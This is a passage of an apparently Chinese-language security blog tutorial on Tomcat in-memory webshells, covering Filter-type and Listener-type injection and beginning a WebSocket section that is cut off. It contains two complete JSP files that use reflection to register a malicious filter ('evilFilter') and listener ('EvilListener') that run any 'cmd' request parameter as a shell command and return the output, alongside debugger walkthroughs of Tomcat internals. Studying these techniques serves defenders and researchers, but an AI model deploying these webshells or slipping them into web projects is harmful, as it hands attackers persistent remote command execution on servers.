型内存马</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContextFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextFiled</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextFiled</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextFiled.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">    filterConfigs.put(<span class="string">&quot;evilFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="Tomcat-Listener-型内存马"><a href="#Tomcat-Listener-型内存马" class="headerlink" title="Tomcat-Listener 型内存马"></a>Tomcat-Listener 型内存马</h3><h4 id="流程分析-2"><a href="#流程分析-2" class="headerlink" title="流程分析"></a>流程分析</h4><p>编写一个简单的HelloListener：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatservletmemshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener(value = &quot;/hello-servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;request destroyed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;request initialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Listener分多种，ServletRequestListener访问服务时触发。同样，在下图位置打下断点，分析调用栈：</p><p><a href="https://pic.imgdb.cn/item/64d26f2b1ddac507cc0866e5.jpg" title="image-20230803163546389" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f2b1ddac507cc0866e5.jpg" alt="image-20230803163546389"></a></p><p>进入<code>org.apache.catalina.core.StandardContext#fireRequestInitEvent</code>：</p><p><a href="https://pic.imgdb.cn/item/64d26f3b1ddac507cc088ea1.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f3b1ddac507cc088ea1.jpg"></a></p><p>其中listener的定义如下：</p><p><a href="https://pic.imgdb.cn/item/64d26f461ddac507cc08a99b.jpg" title="image-20230803163747713" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f461ddac507cc08a99b.jpg" alt="image-20230803163747713"></a></p><p>可以看到listener是把instance进行强转之后得到的。而instance是instances数组中的一个元素，我们看看instances是怎么来的：</p><p><a href="https://pic.imgdb.cn/item/64d26f521ddac507cc08c84f.jpg" title="image-20230803163815234" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f521ddac507cc08c84f.jpg" alt="image-20230803163815234"></a></p><p>跟进<code>org.apache.catalina.core.StandardContext#getApplicationEventListeners</code>：</p><p><a href="https://pic.imgdb.cn/item/64d26f5e1ddac507cc08e61c.jpg" title="image-20230803163938618" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f5e1ddac507cc08e61c.jpg" alt="image-20230803163938618"></a></p><p>我们发现instances是把<code>applicationEventListenersList</code>转为数组得到的，在<code>org.apache.catalina.core.StandardContext#addApplicationEventListener</code>发现<code>applicationEventListenersList</code>的元素是如何添加的：</p><p><a href="https://pic.imgdb.cn/item/64d26f681ddac507cc090196.jpg" title="image-20230803164109053" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f681ddac507cc090196.jpg" alt="image-20230803164109053"></a></p><p>因此注入Listener内存马的方法就很简单了。获取到StandardContext后直接调用addApplicationEventListener方法传入要注入的Listener即可。</p><h4 id="反序列化注入Tomcat-Listener-型内存马"><a href="#反序列化注入Tomcat-Listener-型内存马" class="headerlink" title="反序列化注入Tomcat-Listener 型内存马"></a>反序列化注入Tomcat-Listener 型内存马</h4><p>过于简单，交给读者完成。（其实是我实在懒得写了，嘻嘻～）</p><h4 id="jsp注入Tomcat-Listener-型内存马"><a href="#jsp注入Tomcat-Listener-型内存马" class="headerlink" title="jsp注入Tomcat-Listener 型内存马"></a>jsp注入Tomcat-Listener 型内存马</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line">                <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    response.getWriter().flush();</span><br><span class="line">                    response.getWriter().write(output);</span><br><span class="line">                    response.getWriter().flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextFiled</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextFiled</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextFiled.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">EvilListener</span> <span class="variable">evilListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilListener</span>();</span><br><span class="line">    standardContext.addApplicationEventListener(evilListener);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="Tomcat-Websocket-型内存马"><a href="#Tomcat-Websocket-型内存马" class="headerlink" title="Tomcat-Websocket 型内存马"></a>Tomcat-Websocket 型内存马</h3><p>WebSocket是一种全双工通信协议，即客户端可以向服务端发送请求，服务端也可以主动向客户端推送数据。这样的特点，使得它在一些实时性要求比较高的场景效果斐然（比如微信朋友圈实时通知、在线协同编辑等）。主流浏览器以及一些常见服务端通信框架（Tomcat、netty、undertow、webLogic等）都对WebSocket进行了技术支持。</p><h4 id="流程分析-3"><a href="#流程分析-3" class="headerlink" title="流程分析"></a>流程分析</h4><p>导入依赖，应与自己的Tomcat版本一致：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;tomcat-websocket&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;9.0.76&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>以下是一个简单的Tomcat-Websocket样例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatservletmemshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.websocket.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWebsocket</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Session session;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session, EndpointConfig endpointConfig)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.session = session;</span><br><span class="line">        session.addMessageHandler(<span class="keyword">new</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String message)</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Receice message: &quot;</span>+message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(<span class="string">&quot;Websocket: &quot;</span> + session.toString());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            session.getBasicRemote().sendText(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClose</span><span class="params">(Session session, CloseReason closeReason)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Close!!!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onError</span><span class="params">(Session session, Throwable throwable)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Error!!!&quot;</span>);</span><br><span class="line">        throwable.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatservletmemshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.websocket.Endpoint;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerApplicationConfig;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerEndpointConfig;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EndpointApplicationConfig</span> <span class="keyword">implements</span> <span class="title class_">ServerApplicationConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;ServerEndpointConfig&gt; <span class="title function_">getEndpointConfigs</span><span class="params">(Set&lt;Class&lt;? extends Endpoint&gt;&gt; set)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Set&lt;ServerEndpointConfig&gt; result = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (set.contains(HelloWebsocket.class)) &#123;</span><br><span class="line">            result.add(ServerEndpointConfig.Builder.create(HelloWebsocket.class, <span class="string">&quot;/websocket&quot;</span>).build());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;Class&lt;?&gt;&gt; getAnnotatedEndpointClasses(Set&lt;Class&lt;?&gt;&gt; set) &#123;</span><br><span class="line">        System.out.println(set);</span><br><span class="line">        <span class="keyword">return</span> set;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后可以用以下python代码连接：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">ws = websocket.create_connection(<span class="string">&quot;ws://127.0.0.1:8080/websocket&quot;</span>)</span><br><span class="line">ws.send(<span class="string">&quot;HELLO&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(ws.recv())</span><br><span class="line">ws.close()</span><br></pre></td></tr></table></figure><p>在了解Tomcat-Websocket的加载之前，需要先了解一下Tomcat的SCI机制。这里贴一篇关于SCI机制的文章吧：<a href="https://blog.csdn.net/lqzkcx3/article/details/78507169">https://blog.csdn.net/lqzkcx3/article/details/78507169</a></p><blockquote><ol><li><p>ServletContainerInitializer接口的实现类通过java SPI声明自己是ServletContainerInitializer 的provider.</p></li><li><p>容器启动阶段依据java spi获取到所有ServletContainerInitializer的实现类，然后执行其onStartup方法.</p></li><li><p>另外在实现ServletContainerInitializer时还可以通过@HandlesTypes注解定义本实现类希望处理的类型，容器会将当前应用中所有这一类型（继承或者实现）的类放在ServletContainerInitializer接口的集合参数c中传递进来。如果不定义处理类型，或者应用中不存在相应的实现类，则集合参数c为空.</p></li><li><p>这一类实现了 SCI 的接口，如果做为独立的包发布，在打包时，会在JAR 文件的 META-INF&#x2F;services&#x2F;javax.servlet.ServletContainerInitializer 文件中进行注册。 容器在启动时，就会扫描所有带有这些注册信息的类(@HandlesTypes(WebApplicationInitializer.class)这里就是加载WebApplicationInitializer.class类)进行解析，启动时会调用其 onStartup方法——也就是说servlet容器负责加载这些指定类, 